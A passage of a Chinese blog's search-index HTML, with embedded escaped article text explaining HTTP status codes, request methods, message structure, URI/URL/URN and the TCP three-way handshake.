&lt;td style=&#34;text-align:left&#34;&gt;Use Proxy&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;使用代理。所请求的资源必须通过代理访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;306&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Unused&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;已经被废弃的HTTP状态码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;307&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Temporary Redirect&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;临时重定向。与302类似。使用GET请求重定向&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;400&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Bad Request&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端请求的语法错误，服务器无法理解&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;401&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Unauthorized&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;请求要求用户的身份认证&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;402&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Payment Required&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;保留，将来使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;403&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Forbidden&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器理解请求客户端的请求，但是拒绝执行此请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;404&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Not Found&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置&amp;quot;您所请求的资源无法找到&amp;quot;的个性页面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;405&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Method Not Allowed&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端请求中的方法被禁止&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;406&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Not Acceptable&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器无法根据客户端请求的内容特性完成请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;407&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Proxy Authentication Required&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;408&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Request Time-out&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器等待客户端发送的请求时间过长，超时&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;409&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Conflict&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;410&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Gone&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;411&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Length Required&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器无法处理客户端发送的不带Content-Length的请求信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;412&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Precondition Failed&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端请求信息的先决条件错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;413&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Request Entity Too Large&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;414&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Request-URI Too Large&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;请求的URI过长（URI通常为网址），服务器无法处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;415&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Unsupported Media Type&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器无法处理请求附带的媒体格式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;416&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Requested range not satisfiable&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;客户端请求的范围无效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;417&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Expectation Failed&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器无法满足Expect的请求头信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;500&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Internal Server Error&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器内部错误，无法完成请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;501&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Not Implemented&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器不支持请求的功能，无法完成请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;502&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Bad Gateway&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;503&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Service Unavailable&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;504&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Gateway Time-out&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;充当网关或代理的服务器，未及时从远端服务器获取请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;505&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;HTTP Version not supported&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;服务器不支持请求的HTTP协议的版本，无法完成处理&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">55-http-8-状态码</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-qing-qiu-fang-fa/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;根据 HTTP 标准，HTTP 请求可以使用多种请求方法。&lt;/p&gt;
&lt;p&gt;HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。&lt;/p&gt;
&lt;p&gt;HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。&lt;/p&gt;
&lt;h2 id=&#34;方法&#34;&gt;方法&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;幂等&lt;/strong&gt;是说这个请求可以重复发送多次相同请求求，会返回相同的响应消息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方法&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;请求指定的页面信息，并返回实体主体&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HEAD&lt;/td&gt;
&lt;td&gt;类似于 GET请求，但只返回响应报头，不返回响应正文&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST (非)&lt;/td&gt;
&lt;td&gt;向指定资源提交数据（例如提交表单或者上传文件） 数据被包含在请求体中 POST请求可能会导致新的资源的建立和/或已有资源的修改&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;从客户端向服务器传送的数据取代指定的文档的内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;td&gt;请求服务器删除指定的页面&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CONNECT&lt;/td&gt;
&lt;td&gt;HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OPTIONS&lt;/td&gt;
&lt;td&gt;允许客户端查看服务器的性能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TRACE&lt;/td&gt;
&lt;td&gt;回显服务器收到的请求，主要用于测试或诊断&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PATCH(非)&lt;/td&gt;
&lt;td&gt;是对 PUT 方法的补充，用来对已知资源进行局部更新 。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;GET：get方法一般用于获取服务器资源&lt;/p&gt;
&lt;p&gt;POST：post方法一般用于传输实体主体&lt;/p&gt;
&lt;p&gt;PUT：put方法一般用于传输文件&lt;/p&gt;
&lt;p&gt;DELETE：delete方法用于删除文件&lt;/p&gt;
&lt;p&gt;HEAD：head方法用于获取报文首部，不返回报文主体&lt;/p&gt;
&lt;p&gt;OPTIONS：options方法用于询问请求URI资源支持的方法&lt;/p&gt;
&lt;/blockquote&gt;
">54-http-7-请求方法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-bao-wen/"" data-c="
          &lt;h2 id=&#34;http报文结构&#34;&gt;HTTP报文结构&lt;/h2&gt;
&lt;p&gt;用于HTTP协议交互的信息被称为HTTP报文。请求端（客户端）的HTTP报文叫做&lt;strong&gt;请求报文&lt;/strong&gt;，响应端（服务器端）的叫做&lt;strong&gt;响应报文&lt;/strong&gt;。HTTP报文本身是由多行（用CR+LF作换行符）数据构成的字符串文本。 HTTP报文大致可分为&lt;strong&gt;请求行/响应行、报文首部和报文主体&lt;/strong&gt;两块。两者由最初出现的空行（CR+LF）来划分。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625756720174.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;请求报文&#34;&gt;请求报文&lt;/h3&gt;
&lt;p&gt;请求报文的请求行主要三个部分组成：请求方法、URI地址和HTTP协议版本号。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /test/hi-there.txt HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625756732543.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;响应报文&#34;&gt;响应报文&lt;/h3&gt;
&lt;p&gt;响应报文的响应行主要三个部分组成：HTTP协议版本号、HTTP状态码和状态描述。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625756742764.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">53-http-6-报文</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-url/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;HTTP协议使用 URI 定位互联网上的资源。&lt;/p&gt;
&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;h3 id=&#34;uri&#34;&gt;URI&lt;/h3&gt;
&lt;p&gt;Uniform Resource Identifier：统一资源标识符&lt;/p&gt;
&lt;p&gt;用来唯一标识互联网上的信息资源&lt;/p&gt;
&lt;p&gt;URI包括URL和URN。&lt;/p&gt;
&lt;h3 id=&#34;url&#34;&gt;URL&lt;/h3&gt;
&lt;p&gt;Uniform Resource Locator：统一资源定位器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://user:pass@host.com:80/path?query=string#hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;协议 用户名密码 域名或hostName 端口 路由 搜索参数 哈希(锚点定位)&lt;/p&gt;
&lt;p&gt;上述格式的都叫做URL，平常见到的URI 基本都是URL&lt;/p&gt;
&lt;h3 id=&#34;urn&#34;&gt;URN&lt;/h3&gt;
&lt;p&gt;Uniform Resource Name：统一资源名称(永久统一资源定位符)&lt;/p&gt;
&lt;p&gt;在资源移动之后还能被找到&lt;/p&gt;
&lt;p&gt;目前还没有非常成熟的使用方案&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;假如互联网上的资源换了位置，我们访问之前的路径就会404，但是URL并不会告诉你资源搬到了哪里，URN就是为了解决这个问题，当URN指向一个资源，无论它换了多少位置，依然可以找到它。&lt;/p&gt;
&lt;h2 id=&#34;关系&#34;&gt;关系&lt;/h2&gt;
&lt;p&gt;URI是抽象的定义，不管用什么方法表示，只要能定位一个资源，就叫URI&lt;/p&gt;
&lt;p&gt;定位资源的两种方式：1，URL，用地址定位；2，URN，用名称定位。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;p&gt;找个具体的人（URI），&lt;/p&gt;
&lt;p&gt;如果用地址：住在中国北京昌平区某村多少号房子第几间屋子的人 就是URL，&lt;/p&gt;
&lt;p&gt;如果用身份证号+名字 去找就是URN。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;找个具体的学生(URI)&lt;/p&gt;
&lt;p&gt;如果用地址： 南开小学三年二班的第一排第几列的人 就是URL&lt;/p&gt;
&lt;p&gt;如果用学号+名字 去找就是URN&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web&#34;&gt;标志互联网上的内容&lt;/a&gt;&lt;/p&gt;
">52-http-5-URL</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-tcpip-san-ci-wo-shou/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;目的是为了保证可靠的通信&lt;/p&gt;
&lt;h2 id=&#34;三个版本的解释&#34;&gt;三个版本的解释&lt;/h2&gt;
&lt;h3 id=&#34;版本一&#34;&gt;版本一&lt;/h3&gt;
&lt;p&gt;简单说，让双方都证实对方能发收。&lt;br&gt;
知道对方能收是因为收到对方的因为收到而发的回应。&lt;br&gt;
具体：&lt;br&gt;
1：A发，B收， B知道A能发&lt;br&gt;
2：B发，A收， A知道B能发收&lt;br&gt;
3：A发，B收， B知道A能收&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;tcp三次握手是tcp的建立连接的过程，所谓连接就是客户端知道服务端的发送和接收能力是否正常，服务端知道客户端的发送和接收能力是否正常。&lt;/p&gt;
&lt;p&gt;第一次握手，客户端向服务端发送报文，服务端接收到信息之后，知道了客户端的发送能力正常&lt;/p&gt;
&lt;p&gt;第二次握手，服务端向客户端发送报文，客户端接收到了信息之后，知道了服务端的发送和接收能力都正常&lt;/p&gt;
&lt;p&gt;第三次握手，客户端再向服务端发送报文，服务端接收到信息之后，知道了客户端的发送和接收能力都正常&lt;/p&gt;
&lt;p&gt;至此，三次握手完成，客户端和服务端都确定了双方的发送和接收能力，可以进行数据传输了&lt;/p&gt;
&lt;h3 id=&#34;版本二图解http&#34;&gt;版本二：图解HTTP&lt;/h3&gt;
&lt;p&gt;按层次分，TCP 位于传输层，提供可靠的字节流服务。&lt;/p&gt;
&lt;p&gt;所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确保数据能到达目标&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。用 TCP 协议把数据包送出去后，TCP不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） 和ACK（acknowledgement）。&lt;/p&gt;
&lt;p&gt;发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表“握手”结束。&lt;/p&gt;
&lt;p&gt;若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625668531620.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;除了上述三次握手，TCP 协议还有其他各种手段来保证通信的可靠性。&lt;/p&gt;
&lt;h3 id=&#34;版本三车小胖&#34;&gt;版本三：车小胖&lt;/h3&gt;
&lt;p&gt;TCP作为一种可靠传输控制协议，其&lt;strong&gt;核心思想&lt;/strong&gt;：既要保证数据可靠传输，又要提高传输的效率，而用&lt;strong&gt;三次恰恰可以满足以上两方面的需求！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCP可靠传输的精髓&lt;/strong&gt;：TCP连接的一方A，由操作系统动态随机选取一个&lt;strong&gt;32位长的序列号（Initial Sequence Number）&lt;/strong&gt;，假设A的初始序列号为1000，以该序列号为原点，对自己将要发送的每个字节的数据进行编号，1001，1002，1003…，并把自己的初始序列号ISN告诉B，&lt;strong&gt;让B有一个思想准备&lt;/strong&gt;，什么样编号的数据是合法的，什么编号是非法的，比如编号900就是非法的，同时B还可以对A每一个编号的字节数据进行确认。如果A收到B确认编号为2001，则意味着字节编号为1001-2000，共1000个字节已经安全到达。&lt;/p&gt;
&lt;p&gt;同理B也是类似的操作，假设B的初始序列号ISN为2000，以该序列号为原点，对自己将要发送的每个字节的数据进行编号，2001，2002，2003…，并把自己的初始序列号ISN告诉A，以便A可以确认B发送的每一个字节。如果B收到A确认编号为4001，则意味着字节编号为2001-4000，共2000个字节已经安全到达。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一句话概括，TCP连接握手，握的是啥？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通信双方数据原点的序列号！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以此核心思想我们来分析二、三、四次握手的过程。&lt;/p&gt;
&lt;p&gt;A &amp;lt;-------&amp;gt; B&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;四次握手的过程：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.1&lt;/strong&gt; A 发送同步信号&lt;strong&gt;SYN&lt;/strong&gt; + &lt;strong&gt;A&#39;sInitial sequence number&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.2&lt;/strong&gt; B 确认收到A的同步信号，并记录A&#39;s ISN 到本地，命名 &lt;strong&gt;B&#39;s ACK sequence number&lt;br&gt;
**&lt;br&gt;
&lt;strong&gt;1.3&lt;/strong&gt; B发送同步信号&lt;/strong&gt;SYN** + **B&#39;s Initial sequence number&lt;br&gt;
**&lt;br&gt;
&lt;strong&gt;1.4&lt;/strong&gt; A确认收到B的同步信号，并记录B&#39;s ISN 到本地，命名 &lt;strong&gt;A&#39;s ACK sequence number&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;很显然1.2和1.3 这两个步骤可以合并，**只需要三次握手，**可以提高连接的速度与效率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二次握手的过程：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.1&lt;/strong&gt; A 发送同步信号&lt;strong&gt;SYN&lt;/strong&gt; + &lt;strong&gt;A&#39;sInitial sequence number&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.2&lt;/strong&gt; B发送同步信号&lt;strong&gt;SYN&lt;/strong&gt; + &lt;strong&gt;B&#39;sInitial sequence number&lt;/strong&gt; + &lt;strong&gt;B&#39;s ACK sequence number&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里有一个问题，A与B就A的初始序列号达成了一致，这里是1000。&lt;strong&gt;但是&lt;/strong&gt;B无法知道A是否已经接收到自己的同步信号，如果这个同步信号丢失了，&lt;strong&gt;A和B就B的初始序列号将无法达成一致。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;于是TCP的设计者将&lt;strong&gt;SYN这个同步标志位SYN设计成占用一个字节的编号（FIN标志位也是）&lt;/strong&gt;，既然是一个字节的数据，按照TCP对有数据的TCP segment 必须确认的原则，所以在这里A必须给B一个确认，以确认A已经接收到B的同步信号。&lt;/p&gt;
&lt;p&gt;有童鞋会说，如果A发给B的确认丢了，该如何？&lt;br&gt;
A会超时重传这个ACK吗？不会！&lt;strong&gt;TCP不会为没有数据的ACK超时重传&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那该如何是好？&lt;strong&gt;B如果没有收到A的ACK，会超时重传自己的SYN同步信号，一直到收到A的ACK为止。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;补充阅读&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一个包，即A发给B的SYN 中途被丢，没有到达B&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A会周期性超时重传，直到收到B的确认&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二个包，即B发给A的SYN +ACK 中途被丢，没有到达A&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;B会周期性超时重传，直到收到A的确认&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三个包，即A发给B的ACK 中途被丢，没有到达B&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A发完ACK，单方面认为TCP为 Established状态，而B显然认为TCP为Active状态：&lt;/p&gt;
&lt;p&gt;a. 假定此时双方都没有数据发送，B会周期性超时重传，直到收到A的确认，收到之后B的TCP 连接也为 Established状态，双向可以发包。&lt;/p&gt;
&lt;p&gt;b. 假定此时A有数据发送，B收到A的 Data + ACK，自然会切换为established 状态，并接受A的Data。&lt;/p&gt;
&lt;p&gt;c. 假定B有数据发送，数据发送不了，会一直周期性超时重传SYN + ACK，直到收到A的确认才可以发送数据。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;记得第一次看TCP握手连接的时候，有同样的疑问，我的疑问是，为何不是两次呢？&lt;/p&gt;
&lt;p&gt;后来随着对网络的理解深入，明白TCP报文是交由IP网络来负责运输，IP网络并不能保证TCP报文到达目的地，既然IP网络是指望不上了，那TCP就自力更生吧，TCP必须依赖自身的努力来保证数据传输的可靠。&lt;/p&gt;
&lt;p&gt;TCP看似复杂，其实可以归纳为以下5种报文：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）&lt;/strong&gt;   &lt;strong&gt;SYN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）&lt;/strong&gt;   &lt;strong&gt;Data&lt;/strong&gt; &lt;strong&gt;（唯一携带用户数据）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）&lt;/strong&gt;   &lt;strong&gt;FIN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）&lt;/strong&gt;   &lt;strong&gt;Reset&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（5）&lt;/strong&gt;   &lt;strong&gt;ACK&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中1、2、3分别为&lt;strong&gt;建立连接、数据传输、断开连接&lt;/strong&gt;，这三种报文对方接收到一定要ACK确认，为何要确认，因为这就是可靠传输的依赖的机制。如果对方在超时时间内不确认，发送方会一直重传，直到对方确认为止、或到达重传上限次数而Reset连接。&lt;/p&gt;
&lt;p&gt;4、5 为&lt;strong&gt;重置连接报文、确认ACK报文&lt;/strong&gt;，这两种报文对方接收到要ACK确认吧？不需要！自然发送方也不会重传这2种类型的报文。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为何Reset报文不需要ACK确认?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为发送Reset报文的一端，在发送完这个报文之后，和该TCP Session有关的内存结构体瞬间全部释放，无论对方收到或没有收到，关系并不大。&lt;/p&gt;
&lt;p&gt;如果对方收到Reset报文，也会释放该TCP Session 的相关内存结构体。&lt;/p&gt;
&lt;p&gt;如果对方没有收到Reset 报文，可能会继续发送让接收方弹射出Reset报文的报文，到最后对方一样会收到Reset 报文，并最终释放内存。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为何ACK报文不需要ACK确认?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里的ACK报文，是指没有携带任何数据的裸ACK报文，对方收到这样的ACK报文，自然也不需要ACK。否则，对方为了ACK己方的ACK，那己方收到对方的ACK，也要ACK对方的ACK，这就是一个死循环，永无止息。&lt;/p&gt;
&lt;p&gt;所以为了避免这个死循环，一律不允许ACK对方的裸ACK报文。&lt;/p&gt;
&lt;p&gt;有同学会说，按照这么说，TCP连接应该是四次消息交互啊。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.A 发送SYN 报文给B，这是第一次报文交互。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. B发送ACK确认A的SYN报文，这是第二次报文交互&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. B发送自己的SYN报文给A，这是第三次报文交互&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. A需要ACK确认B的SYN报文，这是第四次报文交互&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以上的演绎没有问题，但是报文2、3为何要分开发送呢？增加了延迟不说，同时还白白浪费了网络的带宽，完全可以将报文2、3合并起来，不就是在报文2的ACK状态位的位置置“1”就结了吗？&lt;/p&gt;
&lt;p&gt;这就是三次消息交互的由来！&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
